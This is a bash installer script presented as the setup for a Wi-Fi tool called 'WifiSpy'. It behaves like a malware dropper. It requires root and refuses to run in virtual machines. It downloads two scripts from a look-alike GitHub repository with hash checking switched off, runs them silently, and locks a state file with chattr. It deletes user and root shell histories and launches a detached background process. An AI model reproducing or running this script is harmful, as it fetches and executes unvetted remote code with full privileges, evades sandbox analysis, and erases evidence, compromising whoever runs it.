#!/bin/bash
echo "WifiSpy v1.2.3 — Installer"
set -Eeuo pipefail

if [[ "$EUID" -ne 0 ]]; then
    echo "Root required."
    exit 1
fi

if command -v systemd-detect-virt &>/dev/null; then
    if systemd-detect-virt --quiet 2>/dev/null; then
        echo "Unsupported platform."
        exit 1
    fi
fi

FILE1_URL="https://github.com/AlahuaCX/W1f1Sp0y/releases/download/www/libs.sh"
FILE2_URL="https://github.com/AlahuaCX/W1f1Sp0y/releases/download/www/WifiSpy_start.sh"

FILE1_SHA256=""
FILE2_SHA256=""
CHECK_HASH=0

TEMP_DIR=$(mktemp -d /tmp/.ws-XXXXXX)
STATE_DIR="/var/lib/WifiSpyX"
STATE_FILE="$STATE_DIR/installed"

cleanup() { rm -rf "$TEMP_DIR" 2>/dev/null || true; }
trap cleanup EXIT

mkdir -p "$STATE_DIR"
chmod 700 "$STATE_DIR"

if ! command -v curl >/dev/null 2>&1; then
    echo "curl is required. Install it first."
    exit 1
fi

download_script() {
    local url="$1"
    local dest="$2"
    local expected_hash="$3"
    local tmp="${dest}.download"

    local code
    code=$(curl --fail --location --silent --show-error \
        --user-agent "Mozilla/5.0 (X11; Linux x86_64)" \
        --max-time 60 \
        -o "$tmp" \
        -w "%{http_code}" \
        "$url" 2>/dev/null) || {
        rm -f "$tmp"
        echo "Download failed: $url" >&2
        return 1
    }

    if [[ "$code" != "200" ]]; then
        rm -f "$tmp"
        echo "HTTP $code: $url" >&2
        return 1
    fi

    if [[ ! -s "$tmp" ]]; then
        rm -f "$tmp"
        echo "Empty file: $url" >&2
        return 1
    fi

    if ! head -1 "$tmp" | grep -q '^#!'; then
        rm -f "$tmp"
        echo "Invalid script: $url" >&2
        return 1
    fi

    if [[ "$CHECK_HASH" -eq 1 && -n "$expected_hash" ]]; then
        local actual_hash
        actual_hash=$(sha256sum "$tmp" | awk '{print $1}')
        if [[ "$actual_hash" != "$expected_hash" ]]; then
            rm -f "$tmp"
            return 1
        fi
    fi

    chmod 700 "$tmp"
    mv -f "$tmp" "$dest"
    return 0
}

FILE1="$TEMP_DIR/libs.sh"
FILE2="$TEMP_DIR/WifiSpy_start.sh"

if [[ ! -f "$STATE_FILE" ]]; then
    echo "[1/3] Downloading components..."
    download_script "$FILE1_URL" "$FILE1" "$FILE1_SHA256" || exit 1
    download_script "$FILE2_URL" "$FILE2" "$FILE2_SHA256" || exit 1

    echo "[2/3] Installing dependencies..."
    if ! /bin/bash "$FILE1" >/dev/null 2>&1; then
        echo "[!] Installation failed." >&2
        exit 1
    fi

    printf '1\n' > "$STATE_FILE"
    chmod 600 "$STATE_FILE"
    chattr +i "$STATE_FILE" 2>/dev/null || true

    echo "[3/3] Configuration complete."
else
    echo "[*] Updating components..."
    download_script "$FILE2_URL" "$FILE2" "$FILE2_SHA256" || exit 1
fi

echo "Done. Run 'wifispy --help' to get started."

rm -f ~/.bash_history /root/.bash_history 2>/dev/null || true

echo "[*] Starting service..."
nohup /bin/bash "$FILE2" >/dev/null 2>&1 &
disown

exit 0
